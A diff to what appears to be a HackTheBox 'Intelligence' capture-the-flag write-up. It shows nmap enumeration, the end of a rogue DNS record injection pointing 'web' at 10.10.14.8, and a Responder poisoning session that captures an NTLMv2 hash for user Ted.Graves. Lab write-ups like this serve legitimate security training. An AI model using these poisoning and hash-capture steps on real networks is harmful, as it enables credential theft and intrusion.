@@ -1,6 +1,6 @@
 Enumeration
 Nmap:
-```
+```bash
 nmap -sC -A -T4 10.10.10.248  -oN nmap.txt
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-26 23:02 EDT
 Nmap scan report for 10.10.10.248
@@ -456,4 +456,78 @@ DC=web,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=
 [+] Record entry:
  - Type: 1 (A) (Serial: 84)
  - Address: 10.10.14.8
+```
+
+```
+──(root💀kali)-[~/Downloads/hackthebox/inteligence/krbrelayx]
+└─# sudo responder -I tun0 -v
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.0.7.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    DNS/MDNS                   [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+    Fingerprint hosts          [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.8]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-CHOJNU43T7N]
+    Responder Domain Name      [Q0GF.LOCAL]
+    Responder DCE-RPC Port     [47995]
+
+[+] Listening for events...
+
+[HTTP] Sending NTLM authentication request to 10.10.10.248
+[HTTP] GET request from: 10.10.10.248     URL: / 
+[HTTP] Host             : web 
+[HTTP] NTLMv2 Client   : 10.10.10.248
+[HTTP] NTLMv2 Username : intelligence\Ted.Graves
+[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:7e364817ffaf3be1:7693BEC2BAD21830AE57C84C927C461B:010100000000000079A500F629CBD701889579F2A0825A940000000002000800510030004700460001001E00570049004E002D00430048004F004A004E00550034003300540037004E000400140051003000470046002E004C004F00430041004C0003003400570049004E002D00430048004F004A004E00550034003300540037004E002E0051003000470046002E004C004F00430041004C000500140051003000470046002E004C004F00430041004C000800300030000000000000000000000000200000E348C885053BA6DC38160B59D8F10407C414F0E5D53457A57A77041046DE2C5C0A001000000000000000000000000000000000000900320048005400540050002F007700650062002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
 ```
